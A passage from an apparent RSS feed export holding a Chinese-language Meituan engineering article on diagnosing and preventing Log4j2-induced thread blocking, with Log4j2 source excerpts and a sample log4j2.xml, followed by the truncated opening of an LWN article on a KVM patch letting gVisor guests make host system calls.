到底什么类加载不了？</h4><p>上述“AsyncAppender导致线程Block”案例中，类加载器无法加载由JVM针对反射调用优化所生成的字节码类，本案例是否也是该原因导致，还待进一步具体分析。</p><p>要找到具体是什么类无法加载，归根结底还是要分析业务异常的具体堆栈。从业务堆栈中可以明显看出来，没有任何堆栈元素和JVM反射调用相关，因此排除JVM反射调用原因，但如下的特殊堆栈信息引起了注意：</p><pre><code>com.sankuai.shepherd.core.process.ProcessHandlerFactory$$Lambda$35/1331430278\n</code></pre><p>从堆栈的关键字$$Lambda$大致能猜测出这是代码里使用了Lambda表达式的缘故，查看代码确实相关部分使用了Lambda表达式，经过断点调试，证实的确无法加载该类。那么，这样的类是怎么来的？</p><p>查阅相关资料得知，Lambda表达式区别于匿名内部类实现，在构建时不会生成class文件，而是在运行时通过invokeDynamic指令动态调用，Lambda表达式的内容会被封装在一个静态方法内，JVM通过ASM字节码技术来动态生成调用类，也就是$$Lambda$这种形式的类，生成类示例如下图20所示：</p><p><img src=\"https://p0.meituan.net/travelcube/576090a21609ebab1e7b0fc4fca0891b108829.png\" alt=\"图20 Lambda生成类示例\" referrerpolicy=\"no-referrer\"></p><p>Lambda表达式的实现原理不是本文重点内容，在此不做过多介绍。项目代码中使用Lambda表达式是再普通不过的事情，但是关于此类的案例却并不多见，实在令人难以置信。继续查阅Lambda表达式相关文档，发现异常堆栈类名包含$$Lambda$这样的关键字，其实是JDK的一个Bug，相关Issue可参考:</p><ul><li><a href=\"https://bugs.openjdk.java.net/browse/JDK-8145964\">NoClassDefFound error in transforming lambdas</a></li><li><a href=\"https://bugs.openjdk.java.net/browse/JDK-8158475\">JVMTI RedefineClasses doesn’t handle anonymous classes properly</a></li></ul><p>值得一提的是，该Bug在JDK9版本已经修复，实际测试中发现，在JDK8的高版本如8U171等已修复该Bug，异常堆栈中不会有类似$$Lambda$的堆栈信息，示例如下图21所示：</p><p><img src=\"https://p0.meituan.net/travelcube/0759cebe265c2b882eff7f94155c214c1089864.png\" alt=\"图21 JDK8U171版本下Lambda异常堆栈示例\" referrerpolicy=\"no-referrer\"></p><h4>3.3.5 为什么要解析异常堆栈？</h4><p>原因和上述“AsyncAppender导致线程Block”案例相似，不再重复分析。</p><h4>3.3.6 问题小结</h4><p>Log4j2打印异常日志时，AsyncAppender会先创建日志事件快照，并进一步触发解析、加载异常堆栈类。JDK 8低版本中使用Lambda表达式所生成的异常堆栈类无法被WebAppClassLoader类加载器加载，因此，当大量包含Lambda表达式调用的异常堆栈被输出到日志时，会频繁地触发类加载，由于类加载过程是synchronized同步加锁的，且每次加载都需要读取文件，速度较慢，从而导致了线程Block。</p><h3>3.4 AsyncLoggerConfig导致线程Block</h3><h4>3.4.1 问题现场</h4><p>收到“jvm.thread.blocked.count”告警后立刻通过监控平台查看线程监控指标，当时的线程堆栈如下图22和图23所示。</p><p><img src=\"https://p0.meituan.net/travelcube/6429a273b7a8272a5a2a28885e5fda27678656.png\" alt=\"\" referrerpolicy=\"no-referrer\"></p><p><img src=\"https://p1.meituan.net/travelcube/fc4bd2d703f55de167f22dc789e9560d352831.png\" alt=\"图22 等待锁的Blocked线程堆栈\" referrerpolicy=\"no-referrer\"></p><p><img src=\"https://p0.meituan.net/travelcube/ac1a68e0fb8f95b05023ff70e1cde18f597675.png\" alt=\"图23 持有锁的Runnable线程堆栈\" referrerpolicy=\"no-referrer\"></p><p>从Blocked线程堆栈不难看出是和日志打印相关，本案例的业务异常和上述“AsyncAppender导致线程Block”的业务异常一样，这里不再重复介绍。</p><p>那么，到底是什么原因导致线程Block呢？接下来本章节将结合下图24所示的调用链路深入分析线程Block的根因。</p><p><img src=\"https://p0.meituan.net/travelcube/b18fe64d9d9a7794d9292df4c0565aff147139.png\" alt=\"图24 日志调用链路\" referrerpolicy=\"no-referrer\"></p><h4>3.4.2 为什么会Block线程？</h4><p>原因和上述“AsyncAppender导致线程Block”案例相似，这里不再重复分析。</p><h4>3.4.3 为什么会触发类加载？</h4><p>原因和上述“AsyncAppender导致线程Block”案例相似，这里不再重复分析。</p><h4>3.4.4 到底是什么类加载不了？</h4><p>原因和上述“AsyncAppender导致线程Block”案例相似，这里不再重复分析。</p><h4>3.4.5 为什么要解析异常堆栈？</h4><p>在开始分析原因之前，先理清楚Log4j2关于日志的几个重要概念：</p><ul><li>&lt;Logger&gt;，日志配置标签，用于XML日志配置文件中，对应Log4j2框架中的LoggerConfig类，同步分发日志事件到对应Appender。</li><li>&lt;AsyncLogger&gt;，日志配置标签，用于XML日志配置文件中，对应Log4j2框架中的AsyncLoggerConfig类，内部使用Disruptor队列异步分发日志事件到对应Appender。</li><li>Logger，同步日志类，用于创建同步日志实例，同步调用ReliabilityStrategy处理日志。</li><li>AsyncLogger，异步日志类，用于创建异步日志实例，内部使用Disruptor队列实现异步调用ReliabilityStrategy处理日志。</li></ul><p>总的来说，&lt;Logger&gt;标签和Logger类是完全不同的两个概念，&lt;AsyncLogger&gt;标签和AsyncLogger类也是完全不同的两个概念，不可混淆。</p><p>由于项目并未配置Log4jContextSelector参数，所以使用的是同步Logger，即通过LoggerFactory.getLogger方法获取的是Logger类实例而不是AsyncLogger类实例，同时由于项目的log4j2.xml配置文件里配置了&lt;AsyncLogger&gt;标签，所以其底层是Logger和AsyncLoggerConfig组合。</p><p>AsyncLoggerConfig处理日志事件简要流程如下图25所示，内部使用Disruptor队列，在生成队列元素时，由translator来负责填充元素字段，并把填充后的元素放入RingBuffer中，于此同时，独立的异步线程从RingBuffer中消费事件，并调用配置在该AsyncLoggerConfig上的Appender处理日志请求。</p><p><img src=\"https://p0.meituan.net/travelcube/efc83d8d180546afa62af11d59d8afa959384.png\" alt=\"图25 AsyncLoggerConfig处理流程\" referrerpolicy=\"no-referrer\"></p><p>AsyncLoggerConfig提供了带有Disruptor队列实现的代理类即AsyncLoggerConfigDisruptor，在日志事件进入RingBuffer时，由于项目使用的是ReusableLogEventFactory，所以由MUTABLE_TRANSLATOR负责初始化日志事件，在此过程中会调用getThrownProxy方法创建ThrowableProxy实例，进而在ThrowableProxy构造函数内部触发解析、加载异常堆栈类。</p><pre><code>// org.apache.logging.log4j.core.async.AsyncLoggerConfigDisruptor$EventTranslatorTwoArg\n\n/**\n * Object responsible for passing on data to a RingBuffer event with a MutableLogEvent.\n */\nprivate static final EventTranslatorTwoArg&lt;Log4jEventWrapper, LogEvent, AsyncLoggerConfig&gt; MUTABLE_TRANSLATOR =\n        new EventTranslatorTwoArg&lt;Log4jEventWrapper, LogEvent, AsyncLoggerConfig&gt;() {\n\n    @Override\n    public void translateTo(final Log4jEventWrapper ringBufferElement, final long sequence,\n            final LogEvent logEvent, final AsyncLoggerConfig loggerConfig) {\n      // 初始化 Disruptor RingBuffer 日志元素字段\n        ((MutableLogEvent) ringBufferElement.event).initFrom(logEvent);\n        ringBufferElement.loggerConfig = loggerConfig;\n    }\n};\n</code></pre><pre><code>// org.apache.logging.log4j.core.impl.MutableLogEvent\n\npublic void initFrom(final LogEvent event) {\n    this.loggerFqcn = event.getLoggerFqcn();\n    this.marker = event.getMarker();\n    this.level = event.getLevel();\n    this.loggerName = event.getLoggerName();\n    this.timeMillis = event.getTimeMillis();\n    this.thrown = event.getThrown();\n  // 触发创建 ThrowableProxy 实例\n    this.thrownProxy = event.getThrownProxy();\n\n    // NOTE: this ringbuffer event SHOULD NOT keep a reference to the specified\n    // thread-local MutableLogEvent's context data, because then two threads would call\n    // ReadOnlyStringMap.clear() on the same shared instance, resulting in data corruption.\n    this.contextData.putAll(event.getContextData());\n\n    this.contextStack = event.getContextStack();\n    this.source = event.isIncludeLocation() ? event.getSource() : null;\n    this.threadId = event.getThreadId();\n    this.threadName = event.getThreadName();\n    this.threadPriority = event.getThreadPriority();\n    this.endOfBatch = event.isEndOfBatch();\n    this.includeLocation = event.isIncludeLocation();\n    this.nanoTime = event.getNanoTime();\n    setMessage(event.getMessage());\n}\n\n@Override\npublic ThrowableProxy getThrownProxy() {\n    if (thrownProxy == null &amp;&amp; thrown != null) {\n      // 构造 ThrowableProxy 时打印异常堆栈\n        thrownProxy = new ThrowableProxy(thrown);\n    }\n    return thrownProxy;\n}\n</code></pre><h4>3.4.6 问题小结</h4><p>Log4j2打印异常日志时，AsyncLoggerConfig会初始化Disruptor RingBuffer日志元素字段，并进一步触发解析、加载异常堆栈类。JVM通过生成字节码的方式优化反射调用性能，但该动态生成的类无法被WebAppClassLoader类加载器加载，因此当大量包含反射调用的异常堆栈被输出到日志时，会频繁地触发类加载，由于类加载过程是synchronized同步加锁的，且每次加载都需要读取文件，速度较慢，从而导致线程Block。</p><h2>4. 避坑指南</h2><p>本章节主要对上述案例中导致线程Block的原因进行汇总分析，并给出相应的解决方案。</p><h3>4.1 问题总结</h3><p><img src=\"https://p0.meituan.net/travelcube/2653a8476fc90a164feaabc95db250fc52379.png\" alt=\"图26 日志异步处理流程\" referrerpolicy=\"no-referrer\"></p><p>日志异步处理流程示意如图26所示，整体步骤如下：</p><ol><li><strong>业务线程组装日志事件对象</strong>，如创建日志快照或者初始化日志字段等。</li><li><strong>日志事件对象入队</strong>，如BlockingQueue队列或Disruptor RingBuffer队列等。</li><li><strong>日志异步线程从队列获取日志事件对象，并输出至目的地</strong>，如本地磁盘文件或远程日志中心等。</li></ol><p>对应地，Log4j2导致线程Block的主要潜在风险点如下：</p><ol><li>如上图标号①所示，<strong>日志事件对象在入队前，组装日志事件时触发了异常堆栈类解析、加载，从而引发线程Block</strong>。</li><li>如上图标号②所示，<strong>日志事件对象在入队时，由于队列满，无法入队，从而引发线程Block</strong>。</li><li>如上图标号③所示，<strong>日志事件对象在出队后，对日志内容进行格式化处理时触发了异常堆栈类解析、加载，从而引发线程 Block</strong>。</li></ol><p>从上述分析不难看出：</p><ol><li>标号①和②处如果发生线程Block，那么会直接影响业务线程池内的所有线程。</li><li>标号③出如果发生线程Block，那么会影响日志异步线程，该线程通常为单线程。</li></ol><p><strong>标号①和②处发生线程Block的影响范围远比标号③更大，因此核心是要避免日志事件在入队操作完成前触发线程Block</strong>。其实日志异步线程通常是单线程，因此对于单个Appender来说，不会出现Block现象，至多会导致异步线程处理速度变慢而已，但如果存在多个异步Appender，那么多个日志异步线程仍然会出现彼此Block的现象。</p><h3>4.2 对症下药</h3><p>搞清楚了日志导致线程Block的原因后，问题也就不难解决，解决方案主要从日志事件“入队前”、“入队时”和“出队后”三方面展开。</p><h4>4.2.1 入队前避免线程Block</h4><p>结合上文分析的“AsyncAppender导致线程Block”、“Lambda表达式导致线程Block”和“AsyncLoggerConfig导致线程Block”案例，日志事件入队前避免线程Block的解决方案可从如下几方面考虑：</p><ol><li>日志事件入队前避免触发异常堆栈类解析、加载操作。</li><li>禁用JVM反射调用优化。</li><li>升级JDK版本修复Lambda类Bug。</li></ol><p>先说方案结论：</p><ol><li><strong>自定义Appender实现，创建日志事件快照时避免触发异常堆栈类解析、加载，美团内部Scribe-Log提供的AsyncScribeAppender即是如此</strong>。</li><li><strong>日志配置文件中不使用&lt;AsyncLogger&gt;标签，可以使用&lt;Logger&gt;标签来代替</strong>。</li></ol><p>下面具体分析方案可行性：</p><p><strong>1.</strong> <strong>日志事件入队前避免触发异常堆栈类解析、加载操作</strong></p><p>如果在日志事件入队前，能避免异常堆栈类解析、加载操作，则可从根本上解决该问题，但在Log4j2的2.17.1版本中AsyncAppender和AsyncLoggerConfig仍存在该问题，此时：</p><ul><li>对于AsyncAppender场景来说，可以通过自定义Appender实现，在生成日志事件快照时避免触发解析、加载异常堆栈类，并在配置文件中使用自定义的Appender代替Log4j2提供的AsyncAppender。自定义AsyncScribeAppender相关代码片段如下。</li></ul><pre><code>// org.apache.logging.log4j.scribe.appender.AsyncScribeAppender\n\n@Override\npublic void append(final LogEvent logEvent) {\n    // ... 以上部分忽略 ...\n    Log4jLogEvent.Builder builder = new Log4jLogEvent.Builder(event);\n    builder.setIncludeLocation(includeLocation);\n    // 创建日志快照，避免解析、加载异常堆栈类\n    final Log4jLogEvent memento = builder.build();\n    // ... 以下部分忽略 ...\n}\n</code></pre><ul><li>对于AsyncLoggerConfig场景来说，可以考虑使用非ReusableLogEventFactory类型的LogEventFactory来规避该问题，除此之外也可以考虑换用LoggerConfig来避免该问题。</li></ul><p><strong>2.</strong> <strong>禁用JVM反射调用优化</strong></p><p>调大inflationThreshold（其类型为 int）值到int最大值，如此，虽然一定范围内（反射调用次数不超过int最大值时）避免了类加载Block问题，但损失了反射调用性能，顾此失彼，且无法根治。另外，对于非反射类问题仍然无法解决，如上文所述的Lambda表达式问题等。</p><p><strong>3.</strong> <strong>升级JDK版本修复Lambda类Bug</strong></p><p>升级JDK版本的确可以解决Lambda表达式问题，但并不能彻底解决线程Block问题，如上文所述的反射调用等。</p><h4>4.2.2 入队时避免线程Block</h4><p>结合上文分析的“日志队列满导致线程Block”案例，日志事件入队时避免线程Block的解决方案可从如下几方面考虑：</p><ol><li>日志队列满时，Appender忽略该日志。</li><li>Appender使用自定义的ErrorHandler实现处理日志。</li><li>关闭StatusConfigListener日志输出。</li></ol><p>先说方案结论：<strong>自定义Appender实现，日志事件入队失败时忽略错误日志，美团内部Scribe-Log提供的AsyncScribeAppender即是如此</strong>。</p><p>下面具体分析方案可行性：</p><p><strong>1.</strong> <strong>日志队列满时Appender忽略该日志</strong></p><p>日志队列满，某种程度上说明日志线程的处理能力不足，在现有机器资源不变的情况下需要做一定取舍，如果日志不是特别重要通常可丢弃该日志，此时：</p><ul><li>对于AsyncAppender在blocking场景来说，可以通过配置log4j2.AsyncQueueFullPolicy=Discard来使用DISCARD策略忽略日志。</li><li>对于AsyncAppender在非blocking场景来说，可以通过自定义Appender实现，在日志事件入队失败后直接忽略错误日志，并在配置文件中使用自定义的Appender代替Log4j2提供的AsyncAppender。自定义AsyncScribeAppender相关代码片段如下。</li></ul><pre><code>// org.apache.logging.log4j.scribe.appender.AsyncScribeAppender\n\n@Override\npublic void append(final LogEvent logEvent) {\n// ... 以上部分忽略 ...\n    if (!transfer(memento)) {\n        if (blocking) {\n            // delegate to the event router (which may discard, enqueue and block, or log in current thread)\n            final EventRouteAsyncScribe route = asyncScribeQueueFullPolicy.getRoute(processingThread.getId(), memento.getLevel());\n            route.logMessage(this, memento);\n        } else {\n          // 自定义printDebugInfo参数，控制是否输出error信息，默认为false\n            if (printDebugInfo) {\n                error(\"Appender \" + getName() + \" is unable to write primary appenders. queue is full\");\n            }\n            logToErrorAppenderIfNecessary(false, memento);\n        }\n    }\n// ... 以下部分忽略 ...\n}\n</code></pre><p><strong>2.</strong> <strong>Appender使用自定义的ErrorHandler实现处理日志</strong></p><p>自定义ErrorHandler，Appender内设置handler为自定义ErrorHandler实例即可，但该方式仅适用于通过Log4j2 API方式创建的Logger，不支持日志配置文件的使用方式。由于大多数用户都使用配置文件方式，所以该方案使用场景有限，不过可以期待后续日志框架支持配置文件自定义ErrorHandler，已有相关<a href=\"https://issues.apache.org/jira/browse/LOG4J2-2927\">Issue: ErrorHandlers on Appenders cannot be configured</a>反馈给社区。</p><p><strong>3.</strong> <strong>关闭StatusConfigListener日志输出</strong></p><ul><li>配置文件中设置Configuration的status属性值为off，则不会创建StatusConfigListener，但此时StatusLogger会调用SimpleLogger来输出日志到System.err，仍不解决问题。</li><li>配置文件中设置Configuration的status属性值为fatal，则只有fatal级别的日志才会输出，普通的error日志直接忽略，但fatal条件过于严苛，可能会忽略一些重要的error日志。</li></ul><h4>4.2.3 出队后避免线程Block</h4><p>日志事件出队后会按照用户配置的输出样式，对日志内容进行格式化转换，此时仍然可能触发解析、加载异常堆栈类。因此，日志出队后避免线程Block的根本解决方法是在异常格式化转换时避免解析、加载异常堆栈类。</p><p>先说方案结论：<strong>显式配置日志输出样式%ex来代替默认的%xEx，避免对日志内容格式化时解析、加载异常堆栈类</strong>。</p><p>下面通过分析日志内容格式化处理流程来介绍解决方案。以PatternLayout为例，日志内容格式化转换流程链路为：Layout-&gt;PatternFormatter-&gt;LogEventPatternConverter。其中LogEventPatternConverter是个抽象类，有两个处理异常的格式化转换具体实现类，分别是ThrowablePatternConverter和ExtendedThrowablePatternConverter。</p><pre><code>// org.apache.logging.log4j.core.layout.PatternLayout\n\n// 将 LogEvent 转换为可以输出的 String\n@Override\npublic String toSerializable(final LogEvent event) {\n  // 由 PatternSerializer 对日志事件格式化处理\n    return eventSerializer.toSerializable(event);\n}\n</code></pre><pre><code>// org.apache.logging.log4j.core.layout.PatternLayout.PatternSerializer\n\n@Override\npublic String toSerializable(final LogEvent event) {\n    final StringBuilder sb = getStringBuilder();\n    try {\n        return toSerializable(event, sb).toString();\n    } finally {\n        trimToMaxSize(sb);\n    }\n}\n\n@Override\npublic StringBuilder toSerializable(final LogEvent event, final StringBuilder buffer) {\n    final int len = formatters.length;\n    for (int i = 0; i &lt; len; i++) {\n    // 由 PatternFormatter 对日志事件格式化处理\n        formatters[i].format(event, buffer);\n    }\n    if (replace != null) { // creates temporary objects\n        String str = buffer.toString();\n        str = replace.format(str);\n        buffer.setLength(0);\n        buffer.append(str);\n    }\n    return buffer;\n}\n</code></pre><pre><code>// org.apache.logging.log4j.core.pattern.PatternFormatter\n\npublic void format(final LogEvent event, final StringBuilder buf) {\n    if (skipFormattingInfo) {\n      // 由 LogEventPatternConverter 对日志事件进行格式化处理\n        converter.format(event, buf);\n    } else {\n        formatWithInfo(event, buf);\n    }\n}\n\nprivate void formatWithInfo(final LogEvent event, final StringBuilder buf) {\n    final int startField = buf.length();\n  // 由 LogEventPatternConverter 对日志事件进行格式化处理\n    converter.format(event, buf);\n    field.format(startField, buf);\n}\n</code></pre><pre><code>// org.apache.logging.log4j.core.pattern.LogEventPatternConverter\n\npublic abstract class LogEventPatternConverter extends AbstractPatternConverter {\n\n    /**\n     * 将日志事件 LogEvent 转换为 String\n     * Formats an event into a string buffer.\n     *\n     * @param event      event to format, may not be null.\n     * @param toAppendTo string buffer to which the formatted event will be appended.  May not be null.\n     */\n    public abstract void format(final LogEvent event, final StringBuilder toAppendTo);\n\n}\n</code></pre><p>日志框架对异常进行格式化转换时，有如下两个配置项可参考，默认配置是%xEx。</p><p><strong>1.</strong> <strong>%ex，仅输出异常信息，不获取扩展信息（jar文件名称和版本信息）</strong></p><p>对应的格式转化类是ThrowablePatternConverter，在format方法内部并没有获取ThrowableProxy对象，所以不会触发解析、加载异常堆栈类。</p><pre><code>// org.apache.logging.log4j.core.pattern.ThrowablePatternConverter\n\n@Plugin(name = \"ThrowablePatternConverter\", category = PatternConverter.CATEGORY)\n@ConverterKeys({ \"ex\", \"throwable\", \"exception\" })\npublic class ThrowablePatternConverter extends LogEventPatternConverter {\n\n    /**\n     * {@inheritDoc}\n     */\n    @Override\n    public void format(final LogEvent event, final StringBuilder buffer) {\n        final Throwable t = event.getThrown();\n\n        if (isSubShortOption()) {\n            formatSubShortOption(t, getSuffix(event), buffer);\n        }\n        else if (t != null &amp;&amp; options.anyLines()) {\n            formatOption(t, getSuffix(event), buffer);\n        }\n    }\n\n    private boolean isSubShortOption() {\n        return ThrowableFormatOptions.MESSAGE.equalsIgnoreCase(rawOption) ||\n                ThrowableFormatOptions.LOCALIZED_MESSAGE.equalsIgnoreCase(rawOption) ||\n                ThrowableFormatOptions.FILE_NAME.equalsIgnoreCase(rawOption) ||\n                ThrowableFormatOptions.LINE_NUMBER.equalsIgnoreCase(rawOption) ||\n                ThrowableFormatOptions.METHOD_NAME.equalsIgnoreCase(rawOption) ||\n                ThrowableFormatOptions.CLASS_NAME.equalsIgnoreCase(rawOption);\n    }\n\n    private void formatSubShortOption(final Throwable t, final String suffix, final StringBuilder buffer) {\n        StackTraceElement[] trace;\n        StackTraceElement throwingMethod = null;\n        int len;\n\n        if (t != null) {\n            trace = t.getStackTrace();\n            if (trace !=null &amp;&amp; trace.length &gt; 0) {\n                throwingMethod = trace[0];\n            }\n        }\n\n        if (t != null &amp;&amp; throwingMethod != null) {\n            String toAppend = Strings.EMPTY;\n\n            if (ThrowableFormatOptions.CLASS_NAME.equalsIgnoreCase(rawOption)) {\n                toAppend = throwingMethod.getClassName();\n            }\n            else if (ThrowableFormatOptions.METHOD_NAME.equalsIgnoreCase(rawOption)) {\n                toAppend = throwingMethod.getMethodName();\n            }\n            else if (ThrowableFormatOptions.LINE_NUMBER.equalsIgnoreCase(rawOption)) {\n                toAppend = String.valueOf(throwingMethod.getLineNumber());\n            }\n            else if (ThrowableFormatOptions.MESSAGE.equalsIgnoreCase(rawOption)) {\n                toAppend = t.getMessage();\n            }\n            else if (ThrowableFormatOptions.LOCALIZED_MESSAGE.equalsIgnoreCase(rawOption)) {\n                toAppend = t.getLocalizedMessage();\n            }\n            else if (ThrowableFormatOptions.FILE_NAME.equalsIgnoreCase(rawOption)) {\n                toAppend = throwingMethod.getFileName();\n            }\n\n            len = buffer.length();\n            if (len &gt; 0 &amp;&amp; !Character.isWhitespace(buffer.charAt(len - 1))) {\n                buffer.append(' ');\n            }\n            buffer.append(toAppend);\n\n            if (Strings.isNotBlank(suffix)) {\n                buffer.append(' ');\n                buffer.append(suffix);\n            }\n        }\n    }\n\n    private void formatOption(final Throwable throwable, final String suffix, final StringBuilder buffer) {\n        final StringWriter w = new StringWriter();\n\n        throwable.printStackTrace(new PrintWriter(w));\n        final int len = buffer.length();\n        if (len &gt; 0 &amp;&amp; !Character.isWhitespace(buffer.charAt(len - 1))) {\n            buffer.append(' ');\n        }\n        if (!options.allLines() || !Strings.LINE_SEPARATOR.equals(options.getSeparator()) || Strings.isNotBlank(suffix)) {\n            final StringBuilder sb = new StringBuilder();\n            final String[] array = w.toString().split(Strings.LINE_SEPARATOR);\n            final int limit = options.minLines(array.length) - 1;\n            final boolean suffixNotBlank = Strings.isNotBlank(suffix);\n            for (int i = 0; i &lt;= limit; ++i) {\n                sb.append(array[i]);\n                if (suffixNotBlank) {\n                    sb.append(' ');\n                    sb.append(suffix);\n                }\n                if (i &lt; limit) {\n                    sb.append(options.getSeparator());\n                }\n            }\n            buffer.append(sb.toString());\n\n        } else {\n            buffer.append(w.toString());\n        }\n    }\n\n    /**\n     * This converter obviously handles throwables.\n     *\n     * @return true.\n     */\n    @Override\n    public boolean handlesThrowable() {\n        return true;\n    }\n\n    protected String getSuffix(final LogEvent event) {\n        //noinspection ForLoopReplaceableByForEach\n        final StringBuilder toAppendTo = new StringBuilder();\n        for (int i = 0, size = formatters.size(); i &lt;  size; i++) {\n            formatters.get(i).format(event, toAppendTo);\n        }\n        return toAppendTo.toString();\n    }\n\n    public ThrowableFormatOptions getOptions() {\n        return options;\n    }\n}\n</code></pre><p><strong>2.</strong> <strong>%xEx，不仅输出异常信息，同时获取扩展信息</strong></p><p>对应的格式转化类是ExtendedThrowablePatternConverter，在format方法内部获取了ThrowableProxy对象，此时一定会触发解析、加载异常堆栈类。</p><pre><code>// org.apache.logging.log4j.core.pattern.ExtendedThrowablePatternConverter\n\n@Plugin(name = \"ExtendedThrowablePatternConverter\", category = PatternConverter.CATEGORY)\n@ConverterKeys({ \"xEx\", \"xThrowable\", \"xException\" })\npublic final class ExtendedThrowablePatternConverter extends ThrowablePatternConverter {\n\n    /**\n     * {@inheritDoc}\n     */\n    @Override\n    public void format(final LogEvent event, final StringBuilder toAppendTo) {\n      // 获取 ThrowableProxy 对象，触发解析、加载异常堆栈类\n        final ThrowableProxy proxy = event.getThrownProxy();\n        final Throwable throwable = event.getThrown();\n        if ((throwable != null || proxy != null) &amp;&amp; options.anyLines()) {\n            if (proxy == null) {\n                super.format(event, toAppendTo);\n                return;\n            }\n            final String extStackTrace = proxy.getExtendedStackTraceAsString(options.getIgnorePackages(),\n                    options.getTextRenderer(), getSuffix(event), options.getSeparator());\n            final int len = toAppendTo.length();\n            if (len &gt; 0 &amp;&amp; !Character.isWhitespace(toAppendTo.charAt(len - 1))) {\n                toAppendTo.append(' ');\n            }\n            toAppendTo.append(extStackTrace);\n        }\n    }\n\n}\n</code></pre><h2>5. 最佳实践</h2><p>本章节主要结合项目在日志使用方面的一系列踩坑经历和实践经验，总结了一份关于日志配置的最佳实践，供大家参考。</p><ol><li><strong>建议日志配置文件中对所有Appender的PatternLayout都增加%ex配置</strong>，因为如果没有显式配置%ex，则异常格式化输出的默认配置是%xEx，此时会打印异常的扩展信息（JAR名称和版本），可能导致业务线程Block。</li><li><strong>不建议日志配置文件中使用AsyncAppender，建议自定义Appender实现</strong>，因为AsyncAppender是日志框架默认提供的，目前最新版本中仍然存在日志事件入队前就触发加载异常堆栈类的问题，可能导致业务线程Block。</li><li><strong>不建议生产环境使用ConsoleAppender</strong>，因为输出日志到Console时有synchronized同步操作，高并发场景下非常容易导致业务线程Block。</li><li><strong>不建议在配置文件中使用&lt;AsyncLogger&gt;标签</strong>，因为日志事件元素在入队前就会触发加载异常堆栈类，可能导致业务线程Block。如果希望使用Log4j2提供的异步日志AsyncLogger，建议配置Log4jContextSelector=org.apache.logging.log4j.core.async.AsyncLoggerContextSelector参数，开启异步日志。</li></ol><p>下面提供一份log4j2.xml配置示例：</p><pre><code>&lt;configuration status=\"warn\"&gt;\n    &lt;appenders&gt;\n        &lt;Console name=\"Console\" target=\"SYSTEM_OUT\" follow=\"true\"&gt;\n            &lt;PatternLayout pattern=\"%d{yyyy/MM/dd HH:mm:ss.SSS} %t [%p] %c{1} (%F:%L) %msg%n %ex\" /&gt;\n        &lt;/Console&gt;\n\n        &lt;XMDFile name=\"ShepherdLog\" fileName=\"shepherd.log\"&gt;\n          &lt;PatternLayout pattern=\"%d{yyyy/MM/dd HH:mm:ss.SSS} %t [%p] %c{1} (%F:%L) %msg%n %ex\" /&gt;\n      &lt;/XMDFile&gt;\n\n        &lt;!--XMDFile异步磁盘日志配置示例--&gt;\n        &lt;!--默认按天&amp;按512M文件大小切分日志，默认最多保留30个日志文件。--&gt;\n        &lt;!--注意：fileName前会自动增加文件路径，只配置文件名即可--&gt;\n        &lt;XMDFile name=\"LocalServiceLog\" fileName=\"request.log\"&gt;\n          &lt;PatternLayout pattern=\"%d{yyyy/MM/dd HH:mm:ss.SSS} %t [%p] %c{1} (%F:%L) %msg%n %ex\" /&gt;\n      &lt;/XMDFile&gt;\n  \n      &lt;!-- 使用自定义的AsyncScribeAppender代替原有的AsycncAppender --&gt;\n        &lt;AsyncScribe name=\"LogCenterAsync\" blocking=\"false\"&gt;\n            &lt;!-- 在指定日志名方面，scribeCategory 和 appkey 两者至少存在一种，且 scribeCategory 高于 appkey。--&gt;\n            &lt;!-- &lt;Property name=\"scribeCategory\"&gt;data_update_test_lc&lt;/Property&gt; --&gt;\n           &lt;LcLayout/&gt;\n        &lt;/AsyncScribe&gt;\n    &lt;/appenders&gt;\n\n    &lt;loggers&gt;\n        &lt;logger name=\"com.sankuai.shepherd\" level=\"info\" additivity=\"false\"&gt;\n            &lt;AppenderRef ref=\"ShepherdLog\" level=\"warn\"/&gt;\n            &lt;AppenderRef ref=\"LogCenterAsync\" level=\"info\"/&gt;\n        &lt;/logger&gt;\n\n        &lt;root level=\"info\"&gt;\n            &lt;!--Console日志是同步、阻塞的，推荐只在本地调试时使用，线上将该配置去掉--&gt;\n            &lt;!--appender-ref ref=\"Console\" /--&gt;\n            &lt;appender-ref ref=\"LocalServiceLog\"/&gt;\n            &lt;appender-ref ref=\"LogCenterAsync\"/&gt;\n        &lt;/root&gt;\n    &lt;/loggers&gt;\n&lt;/configuration&gt;\n</code></pre><h2>6. 作者简介</h2><p>志洋、陈超、李敏、凯晖、殷琦等，均来自美团基础技术部-应用中间件团队。</p><h2>7. 招聘信息</h2><p>美团基础技术部-基础架构团队诚招高级、资深技术专家，Base北京、上海。我们致力于建设美团全公司统一的高并发高性能分布式基础架构平台，涵盖数据库、分布式监控、服务治理、高性能通信、消息中间件、基础存储、容器化、集群调度等基础架构主要的技术领域。欢迎有兴趣的同学投送简历至：edp.itu.zhaopin@meituan.com。</p>"
    },
    "origin": {
        "streamId": 13,
        "title": "美团技术团队",
        "htmlUrl": "https://tech.meituan.com/feed/",
        "feedUrl": "https://rsshub.black-desk.cn/meituan/tech/home"
    }
},
{
    "id": "902585",
    "timestampUsec": "1659109386184947",
    "categories": [
        "user/-/state/com.google/read",
        "user/-/state/com.google/starred"
    ],
    "title": "Direct host system calls from KVM",
    "author": ";corbet",
    "published": 1659104820,
    "updated": 1659104820,
    "alternate": [
        {
            "href": "https://lwn.net/Articles/902585/",
            "type": "text/html"
        }
    ],
    "content": {
        "content": "<div>\n           By <b>Jonathan Corbet</b><br>July 29, 2022\n           </div>\nAs a general rule, virtualization mechanisms are designed to provide strong\nisolation between a host and the guest systems that it runs.  The guests\nare not trusted, and their ability to access or influence anything outside\nof their virtual machines must be tightly controlled.  So a patch series\nallowing guests to execute arbitrary system calls in the host context might\nbe expected to be the cause of significantly elevated eyebrows across the\nnet.  Andrei Vagin has posted <a href=\"https://lwn.net/ml/linux-kernel/20220722230241.1944655-1-avagin@google.com/\">such a\nseries</a> with the expected results.\n<p>\nThe use case for Vagin's work is <a href=\"https://gvisor.dev/\">gVisor</a>,\na container-management platform with a focus on security.  Like a full\nvirtualization system, gVisor runs\ncontainers within a virtual machine (using KVM), but the purpose is not to\nfully isolate those containers from the system.  Instead, KVM is used to\nprovide address-space isolation for processes within containers, but the\nresulting virtual machines do not run a normal operating-system kernel.  Instead,\nthey run a special gVisor kernel that handles system calls made by the\ncontained processes, making security decisions as it goes.\n</p><p>\nThat kernel works in an interesting way; it maps\nitself into each virtual machine's address space to match its layout on the\nhost, then switches between the two as needed.  The function to go to the\nvirtual-machine side is called, perhaps inevitably, <tt>bluepill()</tt>.\nThe execution environment is essentially the same on either side, with the\nsame memory layout, but the guest side is constrained by the\nboundaries placed on the virtual machine.\n</p><p>\nMany of the application's system calls can be 